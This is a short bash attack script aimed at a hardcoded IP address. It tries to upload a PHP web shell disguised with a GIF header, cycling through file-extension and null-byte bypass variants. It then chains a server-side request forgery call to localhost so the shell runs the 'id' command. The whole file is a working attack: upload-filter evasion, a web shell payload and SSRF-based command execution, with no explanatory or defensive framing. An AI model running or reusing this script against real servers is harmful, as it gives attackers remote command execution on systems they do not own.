#!/bin/bash

TARGET="http://3.37.76.41"
UPLOAD="$TARGET/upload.php"
WEBROOT="$TARGET/uploads"
FILENAME="shell"
EXTS=("php" "php5" "php7" "phtml" "phar" "php.jpg" "jpg.php" "php%00.jpg")

PAYLOAD="GIF89a\n<?php system(\$_GET['cmd']); ?>"
TMPDIR=$(mktemp -d)
cd "$TMPDIR" || exit 1

echo "[*] Working from: $TMPDIR"

for ext in "${EXTS[@]}"; do
  FILE="$FILENAME.$ext"
  echo "[*] Trying upload: $FILE"
  echo -e "$PAYLOAD" > "$FILE"

  # 업로드 시도
  RES=$(curl -s -F "file=@$FILE;type=image/jpeg" "$UPLOAD")

  if echo "$RES" | grep -iq "success\|완료\|성공"; then
    echo "[+] Upload successful: $FILE"
    
    # SSRF 호출해서 쉘 테스트
    SSRF_URL="$TARGET/?url=http://127.0.0.1/uploads/$FILE?cmd=id"
    echo "[*] Trying SSRF call → $SSRF_URL"
    
    RES2=$(curl -s "$SSRF_URL")
    
    if echo "$RES2" | grep -iq "uid="; then
      echo -e "\n[🔥] SSRF + Webshell SUCCESS → $WEBROOT/$FILE"
      echo "[🧪] Running: id"
      echo "$RES2"
      exit 0
    else
      echo "[!] Webshell not reachable via SSRF for: $FILE"
    fi
  else
    echo "[x] Upload failed or rejected: $FILE"
  fi
done

echo "[❌] All payloads failed or blocked."
